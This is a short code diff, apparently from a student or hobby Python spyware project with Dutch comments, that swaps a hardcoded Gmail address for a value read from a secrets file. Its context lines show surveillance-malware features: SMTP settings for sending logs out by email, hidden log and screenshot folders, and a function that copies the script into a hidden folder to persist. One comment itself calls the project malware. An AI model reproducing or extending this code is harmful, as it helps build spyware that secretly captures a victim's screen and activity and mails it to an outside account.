@@ -42,7 +42,7 @@ secrets = read_secrets('.secret')
 # EXPRESS EMAIL SETTINGS EXPLICIET VERMELD OM TRANSPARANT TE ZIJN, DIT IS EEN TESTACCOUNT EN WORDT NIET GEBRUIKT VOOR MALWARE APP PASSWORD WORD WEL VERBORGEN
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
-EMAIL = "Rvm855219@gmail.com"
+EMAIL = secrets.get('mail', '')
 PASSWORD = secrets.get('gmail_app_password', '')
 logLock = threading.Lock()
 screenshotCount = 0
@@ -159,7 +159,7 @@ def makeStructure():
         if not os.path.exists(hiddenFolderPath+f"\\Logs_{dateTimeFolder}\\ScreenLogs"):
             os.makedirs(hiddenFolderPath+f"\\Logs_{dateTimeFolder}\\ScreenLogs")
             
-#kopieert het script van waar het ook gerunned wordt
+# kopieert het script van waar het ook gerunned wordt
 def copyScript(hiddenFolderPath):
     scriptPath = os.path.abspath(__file__)
     destinationPath = os.path.join(hiddenFolderPath, os.path.basename(scriptPath))
